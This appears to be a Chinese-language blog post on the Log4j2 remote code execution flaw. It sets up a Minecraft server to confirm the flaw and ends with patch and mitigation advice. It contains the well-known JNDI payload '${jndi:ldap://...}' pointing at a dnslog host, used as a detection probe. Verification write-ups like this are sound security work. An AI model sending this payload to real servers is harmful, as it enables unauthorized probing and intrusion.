Log4j2 是一个无处不在的库，被数百万人用于 Java 应用程序。是由 Apache 基金会开发的开源 Java 日志库。它广泛用于许多应用程序，并作为依赖项出现在许多服务中。这包括企业应用程序，包括在组织内开发的自定义应用程序，以及众多云服务。常见的有

  • Apache Struts2

  • Apache Solr

  • Apache Druid

  • Apache Flink

  • Apache Swift

该漏洞在被利用时会导致在具有系统级权限的易受攻击的服务器上远程执行代码。因此，它的 CVSS v3 评分为 10.0。


搭建我的世界服务器验证一下


游戏环境准备：

先给系统安装上Java环境

sudo apt-get update
sudo apt-get install default-jdk
java -version

接下来下载我的世界服务端

wget https://launcher.mojang.com/v1/objects/35139deedbd5182953cf1caa23835da59ca3d7cd/server.jar

创建一个目录Minecraft，将刚才下载的服务端移动到该目录启动

java -Xms512m -Xmx1024m -jar /root/minecraftserver/server.jar nogui

但是服务端并不会如我们所期望的那样启动，而是会告诉你需要同意条款，条款已自动在服务端所在的目录下生成，名为:eula.txt，使用文本编辑器打开它，将eula=false，将false改为true，重新启动游戏

启动完成之后使用游戏启动器HMCL连接，连接的使用游戏显示使用25565端口，需要放通该端口

成功登陆游戏之后，使用T调出对话框，找到dnslog子域名，使用广为人知的exp

/${jndi:ldap://ns364g.dnslog.cn}

观察dnslog确实收到了dns请求，验证该游戏确实受该漏洞影响，看了游戏论坛也有及时提醒更新


Apache Log4j2 2.15.0 版修复了这个漏洞。如果无法更新版本，则可以应用以下缓解措施：

在 Log4j 版本 (>=2.10) 中，可以通过将系统属性“log4j2.formatMsgNoLookups”设置为“true”或从类路径中删除 JndiLookup 类来缓解此行为
